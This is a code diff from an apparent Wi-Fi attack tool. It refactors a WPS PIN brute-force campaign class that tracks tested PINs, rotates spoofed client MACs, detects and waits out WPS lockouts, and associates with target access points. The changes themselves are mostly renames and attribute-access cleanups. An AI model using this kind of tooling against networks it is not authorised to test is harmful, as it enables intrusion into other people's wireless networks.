@@ -32,7 +32,7 @@ from wifit3.persist.config import Config
 from .campaign import Campaign
 from .wps import known_pins
 from .wps import pins as pinmod
-from .auth_assoc import Association, WlanTransport
+from wifit3.wlan.station import Association, WlanTransport
 from wifit3.dot11 import random_client_mac, str_to_mac
 from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie
 from .wps.lock import LockTracker
@@ -130,7 +130,7 @@ def wps_status_markup(camp) -> str:
         return (f"WPS PIN: [cyan]{tested}[/cyan]/11k · "
                 f"[{color}]{kind} {countdown}[/{color}]")
     if camp.status in ("failed", "error"):
-        reason = getattr(camp, "fail_reason", None)
+        reason = camp.fail_reason
         suffix = f" · [dim]{escape(reason)}[/dim]" if reason else f" [dim]({tested}/11k)[/dim]"
         return f"WPS PIN: [red]{camp.status}[/red]{suffix}"
     eta = _fmt_eta(camp.eta_seconds)
@@ -158,14 +158,13 @@ class WpsCampaign(Campaign):
 
     @classmethod
     def visible(cls, ap) -> bool:
-        return ((getattr(ap, "encryption", None) or "").upper() != "WEP"
-                and bool(getattr(ap, "wps", False)))
+        return (ap.encryption or "").upper() != "WEP" and ap.wps
 
     @classmethod
     def ineligible_reason(cls, ap):
         if ap.is_hidden:
             return "hidden SSID: can't associate"
-        return "WPS locked" if getattr(ap, "wps_locked", False) else None
+        return "WPS locked" if ap.wps_locked else None
 
     def check_auto_stop(self) -> bool:
         return self.state.phase == "done" or self.status in ("failed", "error")
@@ -314,17 +313,18 @@ class WpsCampaign(Campaign):
     # ---- the sweep ----------------------------------------------------------
     async def _ensure_session(self) -> bool:
         if self.assoc is None:
-            # The lease armed our fake MAC (HW-ACK); a _rotate_mac changes it, so re-arm then.
-            rotated = (self._lease is not None and self._lease.mac
-                       and str_to_mac(self._lease.mac) != self.our_mac)
+            # The lease entered active monitor as our MAC; a _rotate_mac changes it, so enter it again.
+            rotated = (self._lease is not None and self._lease.active_monitor_mac
+                       and str_to_mac(self._lease.active_monitor_mac) != self.our_mac)
             if rotated:
-                await self._lease.rearm(self.our_mac)
-                if self._lease.mac:
-                    self.our_mac = str_to_mac(self._lease.mac)
+                await self._lease.enter_active_monitor(self.our_mac)
+                if self._lease.active_monitor_mac:
+                    self.our_mac = str_to_mac(self._lease.active_monitor_mac)
             self.assoc = Association(self.iface, self.bssid, self.target.ssid or "",
                                      self.channel, our_mac=self.our_mac,
                                      assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, self.wsc_2_0),
-                                     should_stop=lambda: self.stopped)
+                                     should_stop=lambda: self.stopped,
+                                     beacon_frame=self.target.last_beacon_frame)
             self.assoc.start()
             self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac)
             self.transport.start()
@@ -479,8 +479,8 @@ class WpsCampaign(Campaign):
         self._lease = self.array.lease(channel=self.channel, fake_mac=self.our_mac,
                                        bssid=str_to_mac(self.bssid), ack_tally=self._tx_ack)
         await self._lease.acquire()
-        if self._lease.mac:
-            self.our_mac = str_to_mac(self._lease.mac)
+        if self._lease.active_monitor_mac:
+            self.our_mac = str_to_mac(self._lease.active_monitor_mac)
         name = self.target.ssid or self.bssid
         logger.info("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
 
@@ -590,7 +590,7 @@ class WpsCampaign(Campaign):
 
     def _beacon_locked(self) -> bool:
         ap = self.array.access_points.get(self.bssid)
-        return bool(getattr(ap, "wps_locked", False)) if ap else False
+        return ap is not None and ap.wps_locked
 
     async def _handle_lock(self, beacon_locked: bool, wait: bool = True) -> None:
         """Mark the lock state, optionally wait it out, then release."""
